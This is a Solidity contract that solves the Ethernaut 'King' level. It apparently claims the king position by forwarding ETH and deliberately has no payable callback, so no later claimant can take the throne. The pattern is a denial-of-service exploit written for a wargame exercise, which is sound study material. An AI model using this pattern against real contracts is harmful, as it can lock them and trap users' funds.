// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title Ethernaut 09 - King Solver
/// @notice Claims the king position while intentionally exposing no payable callback.
contract KingSolver {
    /// @notice Forwards the supplied ETH to the King target.
    /// @param target Address of the King level instance.
    function solve(address payable target) external payable {
        (bool success,) = target.call{value: msg.value}("");

        require(success, "Call failed");
    }
}
